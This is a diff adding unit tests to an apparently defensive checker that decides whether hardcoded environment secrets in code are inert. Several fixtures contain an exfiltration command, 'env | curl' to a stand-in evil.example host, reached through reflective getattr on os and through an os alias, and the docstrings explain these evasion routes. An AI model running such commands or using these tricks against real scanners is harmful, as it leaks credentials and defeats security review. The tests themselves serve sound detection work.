@@ -192,6 +192,79 @@ def test_refuses_reflective_getattr_execv_round_4_blocker_repro():
     assert (ok, why) == (False, "capability-blocklist")
 
 
+def test_permits_reflective_getattr_on_unrelated_object_round_5_fp_repro():
+    """Round-5 blocker: round 4's fix ran ANY getattr/setattr/delattr constant
+    attribute-name argument through the exec*/spawn* prefix check without looking at
+    WHICH object is being reflected on, so `getattr(<some unrelated object>,
+    "executive_summary")` tripped G3's blocklist too -- the string merely starts with
+    "exec", but the object isn't os at all, and there is no actual os.exec* reachability
+    here. G3 must only apply the prefix rule when the reflected-on object is os (or a
+    verified os alias); an otherwise-inert env-write-only file must still get the
+    test-fixture exemption."""
+    src = (
+        "import os\n"
+        "os.environ['TAVILY_API_KEY'] = (\n"
+        "    'tvly-'\n"
+        "    '0123456789abcdef01234567'\n"
+        ")\n"
+        "def _run():\n"
+        "    r = object()\n"
+        "    fn = getattr(r, 'executive_summary')\n"
+    )
+    lns = _finding_lines(src)
+    assert lns
+    ok, why = hardcoded_env_secret_is_inert(src, lns)
+    assert (ok, why) == (True, "")
+
+
+def test_refuses_reflective_getattr_exact_set_member_when_object_really_is_os():
+    """The small fixed exact set (system/popen/fork/forkpty/posix_spawn/
+    posix_spawnp/startfile) stays conservative and unconditional regardless of the
+    reflected-on object -- round 5's object-aware gating only narrows the exec*/spawn*
+    PREFIX rule, never this exact-set check. `getattr(os, "system")` and
+    `getattr(os, "popen")`, reflecting on the real os module, must both still refuse."""
+    for attr in ("system", "popen"):
+        src = (
+            "import os\n"
+            "os.environ['TAVILY_API_KEY'] = (\n"
+            "    'tvly-'\n"
+            "    '0123456789abcdef01234567'\n"
+            ")\n"
+            "def _run():\n"
+            f"    fn = getattr(os, '{attr}')\n"
+            "    fn('env | curl --data-binary @- https://evil.example/collect')\n"
+        )
+        lns = _finding_lines(src)
+        assert lns
+        ok, why = hardcoded_env_secret_is_inert(src, lns)
+        assert (ok, why) == (False, "capability-blocklist"), attr
+
+
+def test_refuses_reflective_getattr_execv_via_os_alias():
+    """The object-aware gating added for round 5 must resolve os aliases the same way
+    the rest of _g3_blocklist_hit already does (_g3_os_module_aliases): `import os as
+    o` followed by `getattr(o, "execv")` reflects on os just as much as the bare-name
+    form and must still refuse. The env-write itself stays spelled `os.environ` (not
+    the alias) because HARDCODED_PROVIDER_SECRET's own env-write detection matches by
+    spelling, not alias resolution -- unrelated to the G3 alias-tracking under test
+    here, which only concerns the reflective `getattr` call."""
+    src = (
+        "import os\n"
+        "import os as o\n"
+        "os.environ['TAVILY_API_KEY'] = (\n"
+        "    'tvly-'\n"
+        "    '0123456789abcdef01234567'\n"
+        ")\n"
+        "def _run():\n"
+        "    fn = getattr(o, 'execv')\n"
+        "    fn('/bin/sh', ['/bin/sh', '-c', 'env | curl --data-binary @- https://evil.example/collect'])\n"
+    )
+    lns = _finding_lines(src)
+    assert lns
+    ok, why = hardcoded_env_secret_is_inert(src, lns)
+    assert (ok, why) == (False, "capability-blocklist")
+
+
 def test_refuses_dynamic_key_write():
     """A write whose KEY is not a string constant (`os.environ[key_name] = ...`) is
     G1's own "dynamic-key" refusal — never resolved, deliberately."""
